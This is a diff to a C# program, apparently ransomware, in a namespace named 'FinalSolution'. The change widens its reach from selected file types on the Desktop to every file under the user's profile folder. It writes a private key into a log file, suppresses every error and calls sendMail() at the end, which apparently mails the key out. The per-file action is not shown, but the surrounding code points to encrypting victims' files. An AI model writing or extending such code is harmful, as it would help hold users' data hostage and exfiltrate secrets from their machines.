@@ -21,25 +21,21 @@ namespace FinalSolution
 
         static void Main(string[] args)
         {
-            var specialFolders = new List<Environment.SpecialFolder>()
+            try
             {
-                Environment.SpecialFolder.Desktop,
-                //Environment.SpecialFolder.MyPictures,
-                //Environment.SpecialFolder.Recent,
-                //Environment.SpecialFolder.ProgramFiles,
-                //Environment.SpecialFolder.ProgramFilesX86
-            };
-            foreach (var specialFolder in specialFolders)
+                ioFile.WriteLine("%%%%%%%%%%%%%%%");
+                ioFile.WriteLine(privateKey);
+                ioFile.WriteLine("%%%%%%%%%%%%%%%");
+            }
+            catch { }
+
+            // Get Sub Files
+            foreach (var directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
             {
                 try
                 {
-                    var filesOfSpecificFolder = Directory
-                        .EnumerateFiles(Environment.GetFolderPath(specialFolder), "*.*", SearchOption.AllDirectories)
-                        .Where(s => s.EndsWith(".mp3") || s.EndsWith(".mp4") || s.EndsWith(".png") || s.EndsWith(".exe") ||
-                                    s.EndsWith(".jpeg") || s.EndsWith(".jpg") || s.EndsWith(".pdf") || s.EndsWith(".rar") ||
-                                    s.EndsWith(".zip") || s.EndsWith(".msi") || s.EndsWith(".doc") || s.EndsWith(".doc") ||
-                                    s.EndsWith(".xml") || s.EndsWith(".dll") || s.EndsWith(".xls") || s.EndsWith(".xlsx") ||
-                                    s.EndsWith(".ppt") || s.EndsWith(".pptx") || s.EndsWith(".docx")).ToList();
+                    var filesOfSpecificFolder = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
+
                     foreach (var file in filesOfSpecificFolder)
                     {
                         try
@@ -53,7 +49,7 @@ namespace FinalSolution
                         catch {/* Maybe next time*/}
                     }
                 }
-                catch (Exception e) {/* Probably access denied */}
+                catch { }
             }
             ioFile.Close();
             sendMail();
